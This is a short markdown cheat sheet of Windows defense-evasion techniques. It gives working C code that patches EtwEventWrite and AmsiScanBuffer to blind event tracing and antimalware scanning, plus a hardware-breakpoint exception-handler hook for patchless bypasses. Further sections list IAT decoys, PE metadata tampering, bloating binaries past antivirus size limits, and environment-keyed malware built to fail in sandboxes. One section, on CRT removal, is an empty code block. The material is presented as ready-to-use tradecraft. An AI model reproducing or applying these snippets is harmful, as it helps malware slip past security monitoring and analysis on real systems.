# Defense Evasion Techniques

## ETW Bypass - Byte Patching
```c
PVOID p = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
DWORD dwOld;
VirtualProtect(p, 3, PAGE_EXECUTE_READWRITE, &dwOld);
memcpy(p, "\x33\xC0\xC3", 3);
VirtualProtect(p, 3, PAGE_EXECUTE_READ, &dwOld);
```

## ETW Bypass - Patchless via Hardware Breakpoints
```c
LONG CALLBACK VehHandler(PEXCEPTION_POINTERS pEx) {
    if (pEx->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        pEx->ContextRecord->Rax = 0;
        pEx->ContextRecord->Rip = *(PULONG64)(pEx->ContextRecord->Rsp);
        pEx->ContextRecord->Rsp += 8;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}
```

## AMSI Bypass - Byte Patching
```c
HMODULE hAmsi = LoadLibraryA("amsi.dll");
PVOID p = GetProcAddress(hAmsi, "AmsiScanBuffer");
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
DWORD dwOld;
VirtualProtect(p, sizeof(patch), PAGE_EXECUTE_READWRITE, &dwOld);
memcpy(p, patch, sizeof(patch));
VirtualProtect(p, sizeof(patch), PAGE_EXECUTE_READ, &dwOld);
```

## AMSI Bypass - Patchless via Hardware Breakpoints
- Same VEH + DR register approach as ETW bypass
- Breakpoint on AmsiScanBuffer, handler returns AMSI_RESULT_CLEAN

## Hardware Breakpoint Hooking Pattern
```c
BOOL SetHwBp(PVOID pTarget) {
    CONTEXT ctx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
    GetThreadContext(GetCurrentThread(), &ctx);
    ctx.Dr0 = (DWORD64)pTarget;
    ctx.Dr7 |= (1 << 0);
    ctx.Dr7 &= ~(3 << 16);
    return SetThreadContext(GetCurrentThread(), &ctx);
}
AddVectoredExceptionHandler(1, VehHandler);
SetHwBp(pTargetFunction);
```

## CRT Library Removal
```c
```

## IAT Camouflage
- Import harmless functions to make IAT look legitimate
- Decoy: MessageBoxA, GetSystemTime, GetComputerNameA
- Real APIs resolved dynamically at runtime

## Binary Metadata Modification
- Modify PE timestamp, checksum, rich header
- Change section names and characteristics
- Alter version info resource and manifest

## File Bloating
- Inflate binary > 100MB to exceed AV scan limits
- Add large resource section or append null bytes
- Many AV engines skip files above size threshold

## DRM-equipped Malware
- Bind execution to specific target environment
- Key derived from machine GUID, hardware ID, domain name
- Only decrypts on intended target, fails in sandbox/analysis
